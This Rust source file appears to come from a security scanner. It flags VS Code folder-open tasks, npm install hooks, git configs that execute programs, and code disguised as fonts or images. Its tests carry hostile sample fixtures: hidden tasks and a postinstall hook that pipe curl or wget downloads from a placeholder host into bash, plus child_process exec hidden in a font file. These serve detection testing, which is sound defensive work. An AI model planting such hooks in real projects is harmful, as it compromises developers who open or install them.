use std::sync::LazyLock;

use bee_evidence::{Evidence, Severity};
use regex::Regex;
use serde_json::Value;

use crate::text::{Context, scan_text};

static MEDIA_REF: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)\.(woff2?|ttf|otf|eot|png|jpe?g|gif|ico|svg|webp|bmp)\b").expect("static")
});

fn line_containing(text: &str, needle: &str) -> Option<usize> {
    text.lines().position(|l| l.contains(needle)).map(|i| i + 1)
}

/// VS Code, Cursor and their forks run `runOn: folderOpen` tasks as soon as a trusted folder
/// opens. Workspace files carry the same block under `tasks`.
pub fn editor_tasks(text: &str, path: &str) -> Vec<Evidence> {
    let parsed: Result<Value, _> = json5::from_str(text);
    let Ok(root) = parsed else {
        if text.contains("folderOpen") {
            return vec![
                Evidence::new(
                    "folder-open-task",
                    Severity::Warning,
                    "Mentions a task that runs when the folder is opened, in a file bee-eater could not parse. Editors are more forgiving than parsers, so assume it runs.",
                )
                .at(path, line_containing(text, "folderOpen")),
            ];
        }
        return Vec::new();
    };

    let mut tasks = Vec::new();
    collect_folder_open(&root, &mut tasks);

    let line = line_containing(text, "folderOpen");
    let mut out = Vec::new();
    for task in tasks {
        let mut commands = Vec::new();
        collect_commands(task, false, &mut commands);
        let joined = commands.join(" ");
        let hidden = task
            .pointer("/presentation/reveal")
            .and_then(Value::as_str)
            .is_some_and(|r| r == "never" || r == "silent");

        let label = task
            .get("label")
            .and_then(Value::as_str)
            .unwrap_or("unnamed");
        let summary = format!(
            "Runs the task \"{label}\" the moment this folder is opened in VS Code or Cursor (once you click Trust){}.",
            if hidden {
                ", with its terminal kept out of sight"
            } else {
                ""
            }
        );
        out.push(
            Evidence::new("folder-open-task", Severity::Warning, summary)
                .at(path, line)
                .excerpt(&joined),
        );

        if MEDIA_REF.is_match(&joined) {
            out.push(
                Evidence::new(
                    "runs-disguised-file",
                    Severity::Danger,
                    "The task that runs on folder open executes a file named like a font or image.",
                )
                .at(path, line)
                .excerpt(&joined),
            );
        }
        for mut e in scan_text(&joined, Context::AutoRun, path, None) {
            e.location = Some(bee_evidence::Location {
                path: path.to_string(),
                line,
            });
            out.push(e);
        }
    }
    out
}

fn collect_folder_open<'a>(v: &'a Value, out: &mut Vec<&'a Value>) {
    match v {
        Value::Object(map) => {
            let runs_on_open = map
                .get("runOptions")
                .and_then(|o| o.get("runOn"))
                .and_then(Value::as_str)
                == Some("folderOpen");
            if runs_on_open {
                out.push(v);
            }
            for child in map.values() {
                collect_folder_open(child, out);
            }
        }
        Value::Array(items) => items.iter().for_each(|i| collect_folder_open(i, out)),
        _ => {}
    }
}

/// Every string under a `command` or `args` key, including the per-OS overrides.
fn collect_commands(v: &Value, under_command: bool, out: &mut Vec<String>) {
    match v {
        Value::String(s) if under_command => out.push(s.clone()),
        Value::Object(map) => {
            for (k, child) in map {
                let is_cmd = under_command || k == "command" || k == "args";
                collect_commands(child, is_cmd, out);
            }
        }
        Value::Array(items) => items
            .iter()
            .for_each(|i| collect_commands(i, under_command, out)),
        _ => {}
    }
}

const NPM_HOOKS: &[&str] = &[
    "preinstall",
    "install",
    "postinstall",
    "prepare",
    "preprepare",
    "postprepare",
    "prepublish",
];

pub fn package_json(text: &str, path: &str) -> Vec<Evidence> {
    let Ok(root) = serde_json::from_str::<Value>(text) else {
        return Vec::new();
    };
    let Some(scripts) = root.get("scripts").and_then(Value::as_object) else {
        return Vec::new();
    };
    let mut out = Vec::new();
    for hook in NPM_HOOKS {
        let Some(cmd) = scripts.get(*hook).and_then(Value::as_str) else {
            continue;
        };
        let line = line_containing(text, &format!("\"{hook}\""));
        out.push(
            Evidence::new(
                "install-hook",
                Severity::Info,
                format!("npm runs the \"{hook}\" script by itself during install."),
            )
            .at(path, line)
            .excerpt(cmd),
        );
        for mut e in scan_text(cmd, Context::AutoRun, path, None) {
            e.location = Some(bee_evidence::Location {
                path: path.to_string(),
                line,
            });
            out.push(e);
        }
    }
    out
}

/// A `.git` directory only arrives with a zip or tarball, never with a clone, and its config
/// can make git itself run a program.
pub fn git_config(text: &str, path: &str) -> Vec<Evidence> {
    let mut out = Vec::new();
    for (i, raw) in text.lines().enumerate() {
        let line = raw.trim();
        let (key, value) = match line.split_once('=') {
            Some((k, v)) => (k.trim().to_ascii_lowercase(), v.trim()),
            None => continue,
        };
        let finding = match key.as_str() {
            "fsmonitor" if !matches!(value, "true" | "false") => Some((
                Severity::Danger,
                "Git will run a program of this folder's choosing every time you check its status.",
            )),
            "hookspath" => Some((
                Severity::Warning,
                "Points git at hook scripts that run automatically on commits and checkouts.",
            )),
            "smudge" | "clean" | "process" => Some((
                Severity::Warning,
                "Git runs a filter program over files on checkout.",
            )),
            "sshcommand" | "askpass" | "pager" | "editor" => Some((
                Severity::Warning,
                "Replaces a program git runs for you with one of this folder's choosing.",
            )),
            _ => None,
        };
        if let Some((sev, summary)) = finding {
            out.push(
                Evidence::new("git-config-exec", sev, summary)
                    .at(path, Some(i + 1))
                    .excerpt(raw),
            );
        }
    }
    out
}

pub enum Magic {
    Compiled(&'static str),
    Other,
}

pub fn magic_of(bytes: &[u8]) -> Magic {
    let starts = |m: &[u8]| bytes.starts_with(m);
    if starts(b"\x7fELF") {
        Magic::Compiled("Linux program")
    } else if starts(&[0xcf, 0xfa, 0xed, 0xfe])
        || starts(&[0xce, 0xfa, 0xed, 0xfe])
        || starts(&[0xca, 0xfe, 0xba, 0xbe])
    {
        Magic::Compiled("Mac program")
    } else if starts(b"MZ") {
        Magic::Compiled("Windows program")
    } else if starts(b"\0asm") {
        Magic::Compiled("WebAssembly module")
    } else {
        Magic::Other
    }
}

pub fn media_kind(ext: &str) -> Option<&'static str> {
    match ext {
        "woff" | "woff2" | "ttf" | "otf" | "eot" => Some("font"),
        "png" | "jpg" | "jpeg" | "gif" | "ico" | "webp" | "bmp" => Some("image"),
        _ => None,
    }
}

static CODE_TOKENS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"require\s*\(|\bfunction\b|=>|\beval\s*\(|\bimport\s|\bexec\s*\(|child_process|#!/")
        .expect("static")
});

/// A font or image whose bytes are not a font or image.
pub fn disguised_media(
    bytes: &[u8],
    text: Option<&str>,
    kind: &str,
    path: &str,
) -> Option<Evidence> {
    match text {
        Some(t) if t.trim().is_empty() => None,
        Some(t) if CODE_TOKENS.is_match(t) => Some(
            Evidence::new(
                "disguised-file",
                Severity::Danger,
                format!("Named like a {kind} file, but it is program code."),
            )
            .at(path, None)
            .excerpt(t),
        ),
        Some(_) => Some(
            Evidence::new(
                "disguised-file",
                Severity::Warning,
                format!("Named like a {kind} file, but it is text."),
            )
            .at(path, None),
        ),
        None => match magic_of(bytes) {
            Magic::Compiled(what) => Some(
                Evidence::new(
                    "disguised-file",
                    Severity::Danger,
                    format!("Named like a {kind} file, but it is a {what}."),
                )
                .at(path, None),
            ),
            Magic::Other => None,
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const TASK: &str = r#"{
  // comments and trailing commas are legal here
  "version": "2.0.0",
  "tasks": [
    {
      "label": "eslint-check",
      "type": "shell",
      "osx": { "command": "curl -L https://x.invalid/settings/mac | bash" },
      "linux": { "command": "wget -qO- https://x.invalid/settings/linux | sh" },
      "presentation": { "reveal": "never", "echo": false },
      "runOptions": { "runOn": "folderOpen" },
    },
  ],
}"#;

    #[test]
    fn folder_open_task_with_download_is_dangerous() {
        let e = editor_tasks(TASK, ".vscode/tasks.json");
        let rules: Vec<_> = e.iter().map(|e| (e.rule, e.severity)).collect();
        assert!(
            rules.contains(&("folder-open-task", Severity::Warning)),
            "{rules:?}"
        );
        assert!(
            rules.contains(&("download-and-run", Severity::Danger)),
            "{rules:?}"
        );
        assert!(e[0].summary.contains("eslint-check"));
        assert!(e[0].summary.contains("out of sight"));
        assert_eq!(e[0].location.as_ref().unwrap().line, Some(11));
    }

    #[test]
    fn folder_open_task_running_a_font() {
        let t = r#"{"tasks":[{"label":"x","command":"node","args":["public/font/fa-brands-regular.woff2"],"runOptions":{"runOn":"folderOpen"}}]}"#;
        let e = editor_tasks(t, ".vscode/tasks.json");
        assert!(
            e.iter()
                .any(|e| e.rule == "runs-disguised-file" && e.severity == Severity::Danger)
        );
    }

    #[test]
    fn ordinary_tasks_are_quiet() {
        let t = r#"{"version":"2.0.0","tasks":[{"label":"build","command":"cargo build"}]}"#;
        assert!(editor_tasks(t, ".vscode/tasks.json").is_empty());
    }

    #[test]
    fn unparseable_file_mentioning_folder_open_still_counts() {
        let t = "{ \"tasks\": [ { runOptions: { runOn: 'folderOpen' } ] ";
        let e = editor_tasks(t, ".vscode/tasks.json");
        assert_eq!(e.len(), 1);
        assert_eq!(e[0].severity, Severity::Warning);
    }

    #[test]
    fn workspace_file_tasks() {
        let t = r#"{"folders":[],"tasks":{"version":"2.0.0","tasks":[{"label":"w","command":"echo hi","runOptions":{"runOn":"folderOpen"}}]}}"#;
        let e = editor_tasks(t, "x.code-workspace");
        assert_eq!(e.len(), 1);
        assert_eq!(e[0].rule, "folder-open-task");
    }

    #[test]
    fn npm_hooks() {
        let p = r#"{
  "name": "x",
  "scripts": {
    "test": "curl https://x.invalid | sh",
    "postinstall": "node -e \"require('child_process').exec('curl -s https://x.invalid/p | bash')\""
  }
}"#;
        let e = package_json(p, "package.json");
        let rules: Vec<_> = e.iter().map(|e| (e.rule, e.severity)).collect();
        assert_eq!(
            rules,
            vec![
                ("install-hook", Severity::Info),
                ("download-and-run", Severity::Danger)
            ]
        );
        assert_eq!(e[1].location.as_ref().unwrap().line, Some(5));
    }

    #[test]
    fn git_config_tricks() {
        let c = "[core]\n\tfsmonitor = .git/x.sh\n\thooksPath = .githooks\n[core]\n\tfsmonitor = true\n";
        let e = git_config(c, ".git/config");
        assert_eq!(e.len(), 2);
        assert_eq!(e[0].severity, Severity::Danger);
        assert_eq!(e[0].location.as_ref().unwrap().line, Some(2));
    }

    #[test]
    fn real_font_is_not_disguised() {
        assert!(disguised_media(b"wOF2\0\0\0\x01", None, "font", "a.woff2").is_none());
    }

    #[test]
    fn a_text_font_cannot_pass_by_starting_with_a_font_signature() {
        let js = "true && require('child_process').exec(x)";
        let e = disguised_media(js.as_bytes(), Some(js), "font", "a.ttf").unwrap();
        assert_eq!(e.severity, Severity::Danger);
    }

    #[test]
    fn a_program_named_like_an_image() {
        let e =
            disguised_media(b"\xcf\xfa\xed\xfe\x07\0\0\x01", None, "image", "logo.png").unwrap();
        assert_eq!(e.severity, Severity::Danger);
        assert!(e.summary.contains("Mac program"));
    }

    #[test]
    fn javascript_in_a_font_is_dangerous() {
        let js = "const c=require('child_process');c.exec(x)";
        let e = disguised_media(js.as_bytes(), Some(js), "font", "a.woff2").unwrap();
        assert_eq!(e.severity, Severity::Danger);
    }
}
